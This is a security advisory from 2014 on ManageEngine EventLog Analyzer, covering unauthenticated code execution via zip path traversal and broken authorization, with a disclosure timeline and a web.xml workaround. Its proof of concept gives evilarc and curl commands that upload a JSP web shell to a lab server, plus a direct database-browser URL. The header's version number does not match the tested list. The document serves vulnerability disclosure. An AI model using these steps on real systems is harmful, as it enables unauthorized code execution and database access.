@@ -1,0 +1,155 @@
+Mogwai Security Advisory MSA-2014-01
+----------------------------------------------------------------------
+Title:              ManageEngine EventLog Analyzer Multiple Vulnerabilities
+Product:            ManageEngine EventLog Analyzer   
+Affected versions:  EventLog Analyzer 9.9 (Build 9002) on Windows/Linux
+Impact:             critical
+Remote:             yes
+Product link:       http://www.manageengine.com/products/eventlog/
+Reported:           18/04/2013
+by:                 Hans-Martin Muench (Mogwai, IT-Sicherheitsberatung Muench)
+
+
+Vendor's Description of the Software:
+----------------------------------------------------------------------
+EventLog Analyzer provides the most cost-effective Security Information and
+Event Management (SIEM) software on the market. Using this Log Analyzer
+software, organizations can automate the entire process of managing terabytes
+of machine generated logs by collecting, analyzing, searching, reporting,
+and archiving from one central location. This event log analyzer software
+helps to mitigate internal threats, conduct log forensics analysis, monitor
+privileged users and comply to different compliance regulatory bodies
+by intelligently analyzing your logs and instantly generating a variety of
+reports like user activity reports, regulatory compliance reports,
+historical trend reports, and more.
+
+
+Business recommendation:
+----------------------------------------------------------------------
+During a penetration test, multiple vulnerabilities have been identified
+that are based on severe design/implementation flaws in the application.
+It is highly recommended not to use this software until a thorough
+security review has been performed by security professionals and all
+identified issues have been resolved.
+
+
+Vulnerability description:
+----------------------------------------------------------------------
+1) Unauthenticated remote code execution
+ME EventLog Analyzer contains a "agentUpload" servlet which is used by Agents
+to send log data as zip files to the central server. Files can be uploaded
+without
+authentication and are stored/decompressed in the "data" subdirectory.
+
+As the decompress procedure is handling the file names in the ZIP file in a
+insecure way it is possible to store files in the web root of server. This can
+be used to upload/execute code with the rights of the application server.
+
+2) Authorization issues
+The EventLog Analyzer web interface does not check if an authenticated has
+sufficient permissions to access certain parts of the application. A low
+privileged
+user (for example guest) can therefore access critical sections of the web
+interface,
+by directly calling the corresponding URLs. This can be used to access the
+database
+browser of the application which gives the attacker full access to the database.
+
+
+Proof of concept:
+----------------------------------------------------------------------
+1) Unauthenticated remote code execution
+
+
+- Create a malicious zip archive with the help of evilarc[1]
+evilarc.py -d 2 -o unix -p webapps/event cmdshell.jsp
+- Send the malicious archive to the agentUpload servlet
+curl -F "payload=@evil.zip" http://172.16.37.131:8400/agentUpload
+- Enjoy your shell
+http://172.16.37.131:8400/cmdshell.jsp
+
+A working Metasploit module will be released next week.
+
+
+2) Authorization issues
+- Log in as a low privileged user (for example guest/guest)
+- Directly call the URL of the database browser
+http://xxx.xxx.xxx.xxx:8400/event/runQuery.do
+
+
+Vulnerable / tested versions:
+----------------------------------------------------------------------
+EventLog Analyzer 8.2 (Build 8020) (Windows)
+EventLog Analyzer 8.2 (Build 8020) (Linux)
+EventLog Analyzer 9.0 (Build 9002) (Windows)
+EventLog Analyzer 9.0 (Build 9002) (Linux)
+
+Other versions might also be vulnerable.
+
+
+Disclosure timeline:
+----------------------------------------------------------------------
+14/04/2013: Vulnerability discovery
+18/04/2013: Informed vendor via ManageEngine Security Response Center (MESRC)
+Form
+23/04/2013: Second try to contact MESRC, as we didn't receive any response from
+the first try.
+23/04/2013: Response from vendor, they wait on some feedback from the
+development team
+10/05/2013: Response from vendor, saying that this is rather a issue than a
+vulnerability, will fix it anyway
+13/05/2013: Technical details including a working proof of concept send
+ManageEngine.
+13/05/2013: Vendor response, say that they forward it to the development team
+24/05/2013: Vendor response, saying that they will fix it in 2013 as they are
+"tightly scheduled on other priorities"
+24/05/2013: Response from us, asking if we will be informed when the
+vulnerability is fixed
+28/05/2013: Response from ManageEngine, saying that we must subscribe to their
+newsletter for release information
+05/09/2013: Verification that exploit is still working with the current version
+30/08/2014: Verification that exploit is still working with the current version
+31/08/2014: Public release
+
+Solution:
+----------------------------------------------------------------------
+No known solution
+
+Workaround:
+----------------------------------------------------------------------
+1) Unauthenticated remote code execution
+If agents are not used to collect log information, access to the servlet
+can be disabled by commenting out the following lines in the web.xml file
+(webapps/event/WEB-INF/web.xml) and restart the service.
+
+
+agentUpload
+com.adventnet.sa.agent.UploadHandlerServlet
+
+
+agentUpload
+/agentUpload
+
+
+
+2) Authorization issues
+No workaround, reduce the attack surface by disabling unused low privileged
+accounts like "guest".
+
+
+Advisory URL:
+----------------------------------------------------------------------
+https://www.mogwaisecurity.de/en/lab/advisories/
+
+
+References
+----------------------------------------------------------------------
+[1] evilarc
+https://github.com/ptoomey3/evilarc
+
+----------------------------------------------------------------------
+Mogwai, IT-Sicherheitsberatung Muench
+Steinhoevelstrasse 2/2
+89075 Ulm (Germany)
+
+info@mogwaisecurity.de
